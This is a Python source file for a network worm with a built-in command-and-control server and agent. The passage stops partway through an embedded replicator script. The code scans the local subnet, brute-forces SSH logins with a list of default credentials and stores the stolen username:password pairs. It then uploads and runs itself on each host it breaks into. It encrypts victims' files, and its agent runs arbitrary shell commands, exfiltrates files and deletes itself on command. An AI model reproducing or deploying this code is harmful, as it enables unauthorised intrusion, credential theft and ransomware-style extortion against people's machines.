import paramiko
import sys
import os
import netifaces
import subprocess
import time
import logging
import shutil
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import base64
import hashlib
import platform
import secrets
import getpass
import json
from pathlib import Path
import socket
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import sqlite3
from datetime import datetime
import uuid
import requests
import queue
import signal

# ============================================================
# CONFIGURATION
# ============================================================
CONFIG_DIR = os.path.expanduser('~/.worm_secure')
CONFIG_FILE = os.path.join(CONFIG_DIR, 'config.json')
DB_FILE = os.path.join(CONFIG_DIR, 'worm_c2.db')
MAX_WORKERS = 10
SCAN_TIMEOUT = 2
SSH_TIMEOUT = 5
C2_SERVER = None  # Set to your C2 server URL if using remote C2

# ============================================================
# DATABASE FOR C2 (Command & Control)
# ============================================================

class WormDatabase:
    """SQLite database for tracking worm infections and C2"""
    
    def __init__(self, db_path=DB_FILE):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Table for infected hosts
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS infected_hosts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id TEXT UNIQUE,
                ip_address TEXT,
                hostname TEXT,
                username TEXT,
                os_info TEXT,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT DEFAULT 'active',
                ssh_credentials TEXT,
                notes TEXT
            )
        ''')
        
        # Table for encrypted files
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS encrypted_files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id TEXT,
                file_path TEXT,
                file_size INTEGER,
                encryption_time TEXT,
                status TEXT DEFAULT 'encrypted',
                decryption_time TEXT,
                FOREIGN KEY (host_id) REFERENCES infected_hosts(host_id)
            )
        ''')
        
        # Table for commands
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command_id TEXT UNIQUE,
                target_host TEXT,
                command TEXT,
                parameters TEXT,
                issued_time TEXT,
                executed_time TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                priority INTEGER DEFAULT 0
            )
        ''')
        
        # Table for collected data
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS collected_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id TEXT,
                data_type TEXT,
                data_content TEXT,
                collection_time TEXT,
                file_path TEXT,
                FOREIGN KEY (host_id) REFERENCES infected_hosts(host_id)
            )
        ''')
        
        # Table for encryption keys
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS encryption_keys (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id TEXT,
                key_id TEXT UNIQUE,
                encrypted_key TEXT,
                salt TEXT,
                created_time TEXT,
                active INTEGER DEFAULT 1,
                FOREIGN KEY (host_id) REFERENCES infected_hosts(host_id)
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def get_connection(self):
        """Get database connection"""
        return sqlite3.connect(self.db_path)
    
    def add_infected_host(self, ip, hostname, username, os_info, ssh_creds):
        """Add or update infected host"""
        host_id = str(uuid.uuid4())
        now = datetime.now().isoformat()
        
        conn = self.get_connection()
        cursor = conn.cursor()
        
        # Check if host already exists
        cursor.execute("SELECT host_id FROM infected_hosts WHERE ip_address = ?", (ip,))
        existing = cursor.fetchone()
        
        if existing:
            host_id = existing[0]
            cursor.execute('''
                UPDATE infected_hosts 
                SET last_seen = ?, status = 'active'
                WHERE host_id = ?
            ''', (now, host_id))
        else:
            cursor.execute('''
                INSERT INTO infected_hosts 
                (host_id, ip_address, hostname, username, os_info, first_seen, last_seen, ssh_credentials)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (host_id, ip, hostname, username, os_info, now, now, ssh_creds))
        
        conn.commit()
        conn.close()
        return host_id
    
    def add_encrypted_file(self, host_id, file_path, file_size):
        """Log an encrypted file"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO encrypted_files 
            (host_id, file_path, file_size, encryption_time, status)
            VALUES (?, ?, ?, ?, 'encrypted')
        ''', (host_id, file_path, file_size, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
    
    def add_command(self, target_host, command, parameters=None, priority=0):
        """Add a command to be executed"""
        command_id = str(uuid.uuid4())[:8]
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO commands 
            (command_id, target_host, command, parameters, issued_time, status, priority)
            VALUES (?, ?, ?, ?, ?, 'pending', ?)
        ''', (command_id, target_host, command, json.dumps(parameters) if parameters else None, 
              datetime.now().isoformat(), priority))
        
        conn.commit()
        conn.close()
        return command_id
    
    def get_pending_commands(self, host_id=None):
        """Get pending commands for a host"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        if host_id:
            cursor.execute('''
                SELECT command_id, command, parameters 
                FROM commands 
                WHERE target_host = ? AND status = 'pending'
                ORDER BY priority DESC, issued_time ASC
            ''', (host_id,))
        else:
            cursor.execute('''
                SELECT command_id, target_host, command, parameters 
                FROM commands 
                WHERE status = 'pending'
                ORDER BY priority DESC, issued_time ASC
            ''', ())
        
        results = cursor.fetchall()
        conn.close()
        return results
    
    def mark_command_executed(self, command_id, result=None):
        """Mark a command as executed"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE commands 
            SET status = 'executed', executed_time = ?, result = ?
            WHERE command_id = ?
        ''', (datetime.now().isoformat(), json.dumps(result) if result else None, command_id))
        
        conn.commit()
        conn.close()
    
    def add_collected_data(self, host_id, data_type, data_content, file_path=None):
        """Store collected data from victims"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO collected_data 
            (host_id, data_type, data_content, collection_time, file_path)
            VALUES (?, ?, ?, ?, ?)
        ''', (host_id, data_type, json.dumps(data_content), datetime.now().isoformat(), file_path))
        
        conn.commit()
        conn.close()
    
    def get_stats(self):
        """Get infection statistics"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        stats = {}
        
        # Total infected hosts
        cursor.execute("SELECT COUNT(*) FROM infected_hosts WHERE status = 'active'")
        stats['total_infected'] = cursor.fetchone()[0]
        
        # Total encrypted files
        cursor.execute("SELECT COUNT(*) FROM encrypted_files WHERE status = 'encrypted'")
        stats['total_encrypted'] = cursor.fetchone()[0]
        
        # Pending commands
        cursor.execute("SELECT COUNT(*) FROM commands WHERE status = 'pending'")
        stats['pending_commands'] = cursor.fetchone()[0]
        
        # Data collected
        cursor.execute("SELECT COUNT(*) FROM collected_data")
        stats['collected_data'] = cursor.fetchone()[0]
        
        conn.close()
        return stats
    
    def get_infected_hosts(self):
        """Get list of all infected hosts"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT host_id, ip_address, hostname, username, os_info, first_seen, last_seen, status
            FROM infected_hosts
            ORDER BY last_seen DESC
        ''')
        
        hosts = cursor.fetchall()
        conn.close()
        
        return [{
            'host_id': h[0],
            'ip': h[1],
            'hostname': h[2],
            'username': h[3],
            'os': h[4],
            'first_seen': h[5],
            'last_seen': h[6],
            'status': h[7]
        } for h in hosts]
    
    def get_encrypted_files(self, host_id=None):
        """Get list of encrypted files"""
        conn = self.get_connection()
        cursor = conn.cursor()
        
        if host_id:
            cursor.execute('''
                SELECT file_path, file_size, encryption_time, status
                FROM encrypted_files
                WHERE host_id = ?
                ORDER BY encryption_time DESC
            ''', (host_id,))
        else:
            cursor.execute('''
                SELECT e.file_path, e.file_size, e.encryption_time, e.status, h.ip_address
                FROM encrypted_files e
                JOIN infected_hosts h ON e.host_id = h.host_id
                ORDER BY e.encryption_time DESC
            ''', ())
        
        files = cursor.fetchall()
        conn.close()
        return files

# ============================================================
# C2 SERVER FUNCTIONALITY (Local/Remote)
# ============================================================

class C2Server:
    """Command and Control Server"""
    
    def __init__(self, db=None):
        self.db = db or WormDatabase()
        self.running = True
        self.command_queue = queue.Queue()
        self.connected_agents = {}
    
    def start(self):
        """Start the C2 server"""
        print("\n" + "="*60)
        print("🖥️  C2 SERVER STARTED")
        print("="*60)
        print(f"📊 Database: {DB_FILE}")
        print(f"📈 Stats: {self.db.get_stats()}")
        print("="*60)
        
        # Start command processing thread
        self.processor_thread = threading.Thread(target=self.process_commands, daemon=True)
        self.processor_thread.start()
        
        # Start status display thread
        self.status_thread = threading.Thread(target=self.display_status, daemon=True)
        self.status_thread.start()
    
    def process_commands(self):
        """Process commands from the queue"""
        while self.running:
            try:
                # Get command from queue (non-blocking with timeout)
                try:
                    command = self.command_queue.get(timeout=1)
                except queue.Empty:
                    continue
                
                if command['type'] == 'remote_exec':
                    # Execute command on target
                    self.execute_remote_command(
                        command['target'],
                        command['cmd'],
                        command.get('params')
                    )
                elif command['type'] == 'change_password':
                    # Change encryption password
                    self.change_encryption_password(
                        command['target'],
                        command['new_password']
                    )
                elif command['type'] == 'collect_data':
                    # Collect data from target
                    self.collect_data_from_host(
                        command['target'],
                        command.get('data_type', 'system_info')
                    )
                elif command['type'] == 'decrypt_files':
                    # Decrypt files on target
                    self.decrypt_files_on_host(
                        command['target'],
                        command.get('password')
                    )
                
            except Exception as e:
                logging.error(f"Command processing error: {e}")
    
    def display_status(self):
        """Display C2 status periodically"""
        while self.running:
            time.sleep(30)
            stats = self.db.get_stats()
            print(f"\n📊 [C2 Status] Infected: {stats['total_infected']} | "
                  f"Files: {stats['total_encrypted']} | "
                  f"Commands: {stats['pending_commands']} | "
                  f"Data: {stats['collected_data']}")
    
    def execute_remote_command(self, target_host, command, params=None):
        """Execute a command on a remote host"""
        print(f"🎯 Executing command on {target_host}: {command}")
        
        # Store command in database
        cmd_id = self.db.add_command(target_host, command, params)
        
        # If we have an active connection, push it immediately
        if target_host in self.connected_agents:
            agent = self.connected_agents[target_host]
            try:
                result = agent.execute_command(command, params)
                self.db.mark_command_executed(cmd_id, result)
                self.db.add_collected_data(target_host, 'command_result', result)
                print(f"✅ Command {cmd_id} executed successfully on {target_host}")
            except Exception as e:
                print(f"❌ Failed to execute command on {target_host}: {e}")
        else:
            print(f"⏳ Command {cmd_id} queued for {target_host}")
        
        return cmd_id
    
    def change_encryption_password(self, target_host, new_password):
        """Change encryption password on target"""
        print(f"🔑 Changing encryption password on {target_host}")
        cmd_id = self.db.add_command(
            target_host, 
            'change_password', 
            {'new_password': new_password}
        )
        return cmd_id
    
    def collect_data_from_host(self, target_host, data_type):
        """Collect data from target host"""
        print(f"📊 Collecting {data_type} from {target_host}")
        cmd_id = self.db.add_command(
            target_host,
            'collect_data',
            {'data_type': data_type}
        )
        return cmd_id
    
    def decrypt_files_on_host(self, target_host, password=None):
        """Decrypt files on target"""
        print(f"🔓 Decrypting files on {target_host}")
        cmd_id = self.db.add_command(
            target_host,
            'decrypt_files',
            {'password': password}
        )
        return cmd_id
    
    def show_infected_hosts(self):
        """Display all infected hosts"""
        hosts = self.db.get_infected_hosts()
        
        print("\n" + "="*80)
        print("🖥️  INFECTED HOSTS")
        print("="*80)
        print(f"{'Host ID':<36} {'IP':<16} {'Hostname':<20} {'Status':<10} {'Last Seen'}")
        print("-"*80)
        
        for host in hosts:
            print(f"{host['host_id'][:8]:<36} {host['ip']:<16} {host['hostname']:<20} "
                  f"{host['status']:<10} {host['last_seen'][:19]}")
        
        print("="*80)
        print(f"Total: {len(hosts)} hosts")
    
    def show_encrypted_files(self):
        """Display all encrypted files"""
        files = self.db.get_encrypted_files()
        
        print("\n" + "="*80)
        print("📁 ENCRYPTED FILES")
        print("="*80)
        print(f"{'Host IP':<16} {'File Path':<50} {'Status':<10} {'Time'}")
        print("-"*80)
        
        for file in files:
            if len(file) >= 5:
                print(f"{file[4]:<16} {file[0][:50]:<50} {file[3]:<10} {file[2][:19]}")
            else:
                print(f"{'N/A':<16} {file[0][:50]:<50} {file[3]:<10} {file[2][:19]}")
        
        print("="*80)
        print(f"Total: {len(files)} files")
    
    def show_collected_data(self):
        """Display collected data"""
        conn = self.db.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT c.data_type, c.collection_time, h.ip_address, c.data_content
            FROM collected_data c
            JOIN infected_hosts h ON c.host_id = h.host_id
            ORDER BY c.collection_time DESC
            LIMIT 20
        ''')
        
        data = cursor.fetchall()
        conn.close()
        
        print("\n" + "="*80)
        print("📊 COLLECTED DATA")
        print("="*80)
        
        for item in data:
            print(f"\n[{item[2]}] {item[0]} - {item[1][:19]}")
            try:
                content = json.loads(item[3])
                print(f"  {json.dumps(content, indent=2)[:200]}")
            except:
                print(f"  {str(item[3])[:200]}")
        
        print("="*80)
    
    def stop(self):
        """Stop the C2 server"""
        self.running = False
        print("🛑 C2 Server stopped")

# ============================================================
# C2 AGENT (Runs on infected machines)
# ============================================================

class C2Agent:
    """Agent running on infected machines"""
    
    def __init__(self, db=None, config=None):
        self.db = db or WormDatabase()
        self.config = config or load_config()
        self.host_id = self.get_or_create_host_id()
        self.running = True
        self.command_handlers = {
            'collect_data': self.handle_collect_data,
            'change_password': self.handle_change_password,
            'decrypt_files': self.handle_decrypt_files,
            'encrypt_files': self.handle_encrypt_files,
            'execute': self.handle_execute,
            'upload_file': self.handle_upload_file,
            'download_file': self.handle_download_file,
            'self_destruct': self.handle_self_destruct,
            'status': self.handle_status
        }
    
    def get_or_create_host_id(self):
        """Get or create unique host ID"""
        # Check if host_id exists in config
        if 'host_id' in self.config:
            return self.config['host_id']
        
        # Create new host_id
        host_id = str(uuid.uuid4())
        self.config['host_id'] = host_id
        save_config(self.config)
        return host_id
    
    def register_with_c2(self, c2_server_url=None):
        """Register this agent with the C2 server"""
        if not c2_server_url and not C2_SERVER:
            # Local C2 - just add to database
            self.register_local()
            return True
        
        # Remote C2 registration would go here
        # Example:
        # try:
        #     response = requests.post(f"{c2_server_url}/register", json={
        #         'host_id': self.host_id,
        #         'ip': get_current_IP_address(),
        #         'hostname': socket.gethostname(),
        #         'os': platform.platform()
        #     })
        #     return response.status_code == 200
        # except:
        #     return False
    
    def register_local(self):
        """Register with local C2 database"""
        ip = get_current_IP_address()
        hostname = socket.gethostname()
        username = os.getlogin()
        os_info = platform.platform()
        
        self.db.add_infected_host(ip, hostname, username, os_info, 'local_infection')
        print(f"✅ Registered with C2: {hostname} ({ip})")
        return True
    
    def check_for_commands(self):
        """Check for pending commands from C2"""
        pending = self.db.get_pending_commands(self.host_id)
        
        for cmd in pending:
            cmd_id = cmd[0]
            command = cmd[1]
            parameters = json.loads(cmd[2]) if cmd[2] else {}
            
            print(f"📨 Received command: {command} (ID: {cmd_id})")
            
            # Execute the command
            handler = self.command_handlers.get(command)
            if handler:
                try:
                    result = handler(parameters)
                    self.db.mark_command_executed(cmd_id, result)
                    print(f"✅ Command {cmd_id} executed successfully")
                except Exception as e:
                    self.db.mark_command_executed(cmd_id, {'error': str(e)})
                    print(f"❌ Command {cmd_id} failed: {e}")
            else:
                self.db.mark_command_executed(cmd_id, {'error': f'Unknown command: {command}'})
                print(f"❌ Unknown command: {command}")
    
    def handle_collect_data(self, params):
        """Handle collect data command"""
        data_type = params.get('data_type', 'system_info')
        collected = {}
        
        if data_type == 'system_info':
            collected['hostname'] = socket.gethostname()
            collected['ip'] = get_current_IP_address()
            collected['os'] = platform.platform()
            collected['user'] = os.getlogin()
            collected['cwd'] = os.getcwd()
            collected['files'] = len(os.listdir('.'))
        
        elif data_type == 'file_list':
            path = params.get('path', '.')
            if os.path.exists(path):
                files = []
                for item in os.listdir(path):
                    full_path = os.path.join(path, item)
                    if os.path.isfile(full_path):
                        files.append({
                            'name': item,
                            'size': os.path.getsize(full_path),
                            'modified': datetime.fromtimestamp(
                                os.path.getmtime(full_path)
                            ).isoformat()
                        })
                collected['files'] = files
                collected['path'] = path
        
        elif data_type == 'processes':
            try:
                import psutil
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
                    try:
                        processes.append(proc.info)
                    except:
                        pass
                collected['processes'] = processes[:50]  # Limit to 50
            except:
                collected['error'] = 'psutil not available'
        
        # Store collected data
        self.db.add_collected_data(self.host_id, data_type, collected)
        
        return {'status': 'success', 'data_type': data_type, 'collected': len(collected)}
    
    def handle_change_password(self, params):
        """Handle password change command"""
        new_password = params.get('new_password')
        if not new_password:
            return {'error': 'No new password provided'}
        
        # Update password hash
        config = load_config()
        new_hash = hash_password(new_password)
        config['password_hash'] = new_hash
        save_config(config)
        
        return {'status': 'success', 'message': 'Password changed successfully'}
    
    def handle_decrypt_files(self, params):
        """Handle decrypt files command"""
        password = params.get('password')
        if not password:
            # Try to use stored password (would need user input in real scenario)
            return {'error': 'Password required for decryption'}
        
        # This would call your decrypt_files function
        result = decrypt_files_with_password(password)
        return {'status': 'success', 'result': result}
    
    def handle_encrypt_files(self, params):
        """Handle encrypt files command"""
        result = auto_encrypt_files()
        return {'status': 'success', 'result': result}
    
    def handle_execute(self, params):
        """Handle arbitrary command execution"""
        cmd = params.get('cmd')
        if not cmd:
            return {'error': 'No command specified'}
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return {
                'status': 'success',
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'error': 'Command timed out'}
        except Exception as e:
            return {'error': str(e)}
    
    def handle_upload_file(self, params):
        """Handle file upload command"""
        local_path = params.get('local_path')
        remote_path = params.get('remote_path')
        
        if not local_path or not remote_path:
            return {'error': 'Missing paths'}
        
        try:
            shutil.copy2(local_path, remote_path)
            return {
                'status': 'success',
                'message': f'Copied {local_path} to {remote_path}'
            }
        except Exception as e:
            return {'error': str(e)}
    
    def handle_download_file(self, params):
        """Handle file download command"""
        file_path = params.get('file_path')
        if not file_path or not os.path.exists(file_path):
            return {'error': 'File not found'}
        
        try:
            with open(file_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
            
            # Store in database
            self.db.add_collected_data(
                self.host_id, 
                'downloaded_file', 
                {'path': file_path, 'size': os.path.getsize(file_path)},
                file_path
            )
            
            return {
                'status': 'success',
                'path': file_path,
                'content': content[:1000],  # Limit for display
                'size': os.path.getsize(file_path)
            }
        except Exception as e:
            return {'error': str(e)}
    
    def handle_self_destruct(self, params):
        """Handle self-destruct command"""
        print("💣 Self-destruct activated!")
        
        # Remove itself
        try:
            os.remove(sys.argv[0])
        except:
            pass
        
        # Clear config
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
        
        self.running = False
        return {'status': 'success', 'message': 'Self-destruct complete'}
    
    def handle_status(self, params):
        """Handle status request"""
        stats = self.db.get_stats()
        return {
            'status': 'success',
            'host_id': self.host_id,
            'stats': stats
        }
    
    def run(self):
        """Main agent loop"""
        print(f"🤖 C2 Agent started (ID: {self.host_id[:8]})")
        
        # Register with C2
        self.register_local()
        
        # Command check loop
        while self.running:
            try:
                self.check_for_commands()
                time.sleep(60)  # Check every minute
            except KeyboardInterrupt:
                break
            except Exception as e:
                logging.error(f"Agent error: {e}")
                time.sleep(60)

# ============================================================
# MODIFIED ENCRYPTION FUNCTIONS
# ============================================================

def load_config():
    """Load configuration from file"""
    ensure_config_dir()
    
    if not os.path.exists(CONFIG_FILE):
        return {"password_hash": "", "files_encrypted": False}
    
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"password_hash": "", "files_encrypted": False}

def save_config(config):
    """Save configuration to file"""
    ensure_config_dir()
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def ensure_config_dir():
    """Create config directory if it doesn't exist"""
    Path(CONFIG_DIR).mkdir(parents=True, exist_ok=True)

def generate_salt():
    """Generate a cryptographically secure random salt"""
    return secrets.token_bytes(32)

def hash_password(password, salt=None):
    """Hash a password using PBKDF2 with a random salt"""
    if salt is None:
        salt = generate_salt()
    
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=600000,
        backend=default_backend()
    )
    
    hash_value = kdf.derive(password.encode('utf-8'))
    
    salt_b64 = base64.b64encode(salt).decode('utf-8')
    hash_b64 = base64.b64encode(hash_value).decode('utf-8')
    
    return f"{salt_b64}:{hash_b64}"

def verify_password(password, stored_hash):
    """Verify a password against a stored hash"""
    try:
        salt_b64, hash_b64 = stored_hash.split(':')
        salt = base64.b64decode(salt_b64)
        stored_hash_bytes = base64.b64decode(hash_b64)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=600000,
            backend=default_backend()
        )
        
        password_hash = kdf.derive(password.encode('utf-8'))
        return password_hash == stored_hash_bytes
    except Exception:
        return False

def generate_key_from_password(password, salt=None):
    """Generate encryption key from password"""
    if salt is None:
        salt = generate_salt()
    
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=600000,
        backend=default_backend()
    )
    
    key = base64.urlsafe_b64encode(kdf.derive(password.encode('utf-8')))
    return key, salt

def list_all_files(root_folder):
    """List all files in the directory"""
    files = []
    try:
        if not os.path.exists(root_folder):
            return files
            
        for root, dirs, filenames in os.walk(root_folder):
            for filename in filenames:
                file_path = os.path.join(root, filename)
                if not file_path.endswith(('.py', '.pyc', '.pyo')):
                    files.append(file_path)
    except Exception as e:
        print(f"Error listing files: {e}")
    return files

def auto_encrypt_files():
    """Encrypt files with unique salt per file"""
    print("=== AUTOMATIC ENCRYPTION ===")
    
    try:
        config = load_config()
        db = WormDatabase()
        host_id = config.get('host_id', 'unknown')
        
        root_folder = os.path.expanduser('~/Desktop/crypto_test')
        
        if not os.path.exists(root_folder):
            os.makedirs(root_folder)
            with open(os.path.join(root_folder, 'test_file.txt'), 'w') as f:
                f.write("This is a test file for encryption.")
        
        password = getpass.getpass("Enter encryption password: ")
        
        if not verify_password(password, config["password_hash"]):
            print("❌ Password verification failed!")
            return False
        
        files = list_all_files(root_folder)
        print(f"📁 Found {len(files)} files to encrypt")
        
        if len(files) == 0:
            print("No files found to encrypt!")
            return False
        
        key, salt = generate_key_from_password(password)
        fernet = Fernet(key)
        
        encrypted_count = 0
        for file_path in files:
            try:
                with open(file_path, "rb") as thefile:
                    contents = thefile.read()
                
                if len(contents) == 0:
                    continue
                
                salt_length = len(salt).to_bytes(4, byteorder='big')
                encrypted_data = fernet.encrypt(contents)
                combined_data = salt_length + salt + encrypted_data
                
                with open(file_path, "wb") as thefile:
                    thefile.write(combined_data)
                encrypted_count += 1
                
                # Log to database
                db.add_encrypted_file(host_id, file_path, len(contents))
                print(f"✅ Encrypted: {file_path}")
            except Exception as e:
                print(f"❌ Couldn't encrypt {file_path}: {e}")
        
        if encrypted_count > 0:
            print(f"✅ Encryption complete! {encrypted_count} files encrypted.")
            config["files_encrypted"] = True
            save_config(config)
            return True
        else:
            print("No files were encrypted.")
            return False
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def decrypt_files_with_password(password):
    """Decrypt files using provided password"""
    config = load_config()
    db = WormDatabase()
    host_id = config.get('host_id', 'unknown')
    
    if not verify_password(password, config["password_hash"]):
        return {'error': 'Wrong password'}
    
    try:
        root_folder = os.path.expanduser('~/Desktop/crypto_test')
        files = list_all_files(root_folder)
        
        if len(files) == 0:
            return {'error': 'No files found'}
        
        decrypted_count = 0
        for file_path in files:
            try:
                with open(file_path, "rb") as thefile:
                    file_data = thefile.read()
                
                if len(file_data) < 4:
                    continue
                    
                salt_length = int.from_bytes(file_data[:4], byteorder='big')
                if len(file_data) < 4 + salt_length:
                    continue
                    
                salt = file_data[4:4+salt_length]
                encrypted_data = file_data[4+salt_length:]
                
                key, _ = generate_key_from_password(password, salt)
                fernet = Fernet(key)
                
                contents_decrypted = fernet.decrypt(encrypted_data)
                with open(file_path, "wb") as thefile:
                    thefile.write(contents_decrypted)
                decrypted_count += 1
                print(f"✅ Decrypted: {file_path}")
            except Exception as e:
                print(f"❌ Couldn't decrypt {file_path}: {e}")
        
        return {'status': 'success', 'decrypted': decrypted_count}
        
    except Exception as e:
        return {'error': str(e)}

def decrypt_files():
    """Decrypt files using stored salts"""
    print("=== FILE DECRYPTION ===")
    
    config = load_config()
    user_password = getpass.getpass("Enter your password to decrypt files: ")
    
    result = decrypt_files_with_password(user_password)
    
    if result.get('status') == 'success':
        config["files_encrypted"] = False
        save_config(config)
        print(f"✅ Decryption complete! {result.get('decrypted', 0)} files decrypted.")
        return True
    else:
        print(f"❌ Decryption failed: {result.get('error', 'Unknown error')}")
        return False

# ============================================================
# ENHANCED NETWORK FUNCTIONS
# ============================================================

def get_network_range():
    """Automatically detect the local network range"""
    try:
        interfaces = netifaces.interfaces()
        
        for interface in interfaces:
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    ip = addr['addr']
                    netmask = addr.get('netmask')
                    
                    if ip.startswith('127.'):
                        continue
                    
                    if netmask:
                        ip_parts = [int(x) for x in ip.split('.')]
                        mask_parts = [int(x) for x in netmask.split('.')]
                        
                        network = []
                        for i in range(4):
                            network.append(str(ip_parts[i] & mask_parts[i]))
                        
                        return '.'.join(network) + '.'
        
        return '192.168.1.'
    except Exception as e:
        logging.warning(f"Could not detect network: {e}")
        return '192.168.1.'

def ping_host(ip):
    """Ping a host to check if it's alive"""
    try:
        if platform.system() == "Windows":
            cmd = ['ping', '-n', '1', '-w', str(SCAN_TIMEOUT * 1000), ip]
        else:
            cmd = ['ping', '-c', '1', '-W', str(SCAN_TIMEOUT), ip]
        
        with open(os.devnull, 'w') as devnull:
            result = subprocess.call(cmd, stdout=devnull, stderr=devnull, timeout=SCAN_TIMEOUT + 1)
            return result == 0
    except:
        return False

def get_list_of_hosts():
    """Discover hosts on the network efficiently"""
    print("🔍 Scanning network for hosts...")
    
    network_prefix = get_network_range()
    hosts = []
    
    local_ip = get_current_IP_address()
    local_last_octet = local_ip.split('.')[-1] if local_ip else None
    
    ip_range = range(1, 255)
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_ip = {}
        for i in ip_range:
            ip = f"{network_prefix}{i}"
            if local_last_octet and str(i) == local_last_octet:
                continue
            future = executor.submit(ping_host, ip)
            future_to_ip[future] = ip
        
        for future in as_completed(future_to_ip):
            ip = future_to_ip[future]
            try:
                if future.result():
                    hosts.append(ip)
                    print(f"✅ Found host: {ip}")
            except:
                pass
    
    print(f"📊 Found {len(hosts)} active hosts")
    return hosts

def get_current_IP_address():
    """Get current IP address with better detection"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        pass
    
    try:
        for interface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    ip = addr['addr']
                    if not ip.startswith('127.'):
                        return ip
    except:
        pass
    
    return "127.0.0.1"

# ============================================================
# ENHANCED SSH ATTACK FUNCTIONS
# ============================================================

def load_password_list():
    """Load passwords from file, with fallback to default list"""
    default_passwords = [
        ("root", "root"),
        ("root", "password"),
        ("admin", "admin"),
        ("admin", "password"),
        ("user", "user"),
        ("user", "password"),
        ("pi", "raspberry"),
        ("ubuntu", "ubuntu"),
        ("test", "test"),
        ("guest", "guest"),
    ]
    
    try:
        if os.path.exists("./passwords.txt"):
            with open("./passwords.txt", "r") as f:
                passwords = []
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        parts = line.split()
                        if len(parts) >= 2:
                            passwords.append((parts[0], parts[1]))
                if passwords:
                    return passwords
    except Exception as e:
        logging.warning(f"Could not load passwords.txt: {e}")
    
    print("ℹ️ Using default password list")
    return default_passwords

def try_ssh_connection(ip, username, password):
    """Try a single SSH connection attempt"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(ip, username=username, password=password, timeout=SSH_TIMEOUT)
        return ssh
    except paramiko.AuthenticationException:
        return None
    except Exception as e:
        logging.debug(f"SSH connection error to {ip}: {e}")
        return None

def attack_ssh(ip, db=None):
    """Attack a single host with all password combinations"""
    print(f"🎯 Attacking host: {ip}")
    
    passwords = load_password_list()
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for username, password in passwords:
            future = executor.submit(try_ssh_connection, ip, username, password)
            futures.append((future, username, password))
        
        for future, username, password in futures:
            try:
                ssh = future.result(timeout=SSH_TIMEOUT + 5)
                if ssh:
                    print(f"✅ SUCCESS! {username}:{password} on {ip}")
                    
                    # Get host info
                    stdin, stdout, stderr = ssh.exec_command("hostname && cat /etc/os-release 2>/dev/null || echo 'Unknown OS'")
                    hostname = stdout.read().decode().strip().split('\n')[0]
                    os_info = stdout.read().decode().strip() if stdout else 'Unknown'
                    
                    # Register in C2 database
                    if db:
                        host_id = db.add_infected_host(
                            ip, 
                            hostname, 
                            username, 
                            os_info,
                            f"{username}:{password}"
                        )
                    
                    upload_and_execute(ssh, ip)
                    ssh.close()
                    return True
            except:
                pass
    
    print(f"❌ No credentials found for {ip}")
    return False

def create_replicator_script():
    """Create the replicator.py file if it doesn't exist"""
    replicator_code = '''#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import socket
import paramiko
import netifaces
import threading
import logging
import json

# This is the replicator worm that spreads to other hosts
def get_network_range():
    """Detect local network"""
    try:
        import netifaces
        interfaces = netifaces.interfaces()
        for interface in interfaces:
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
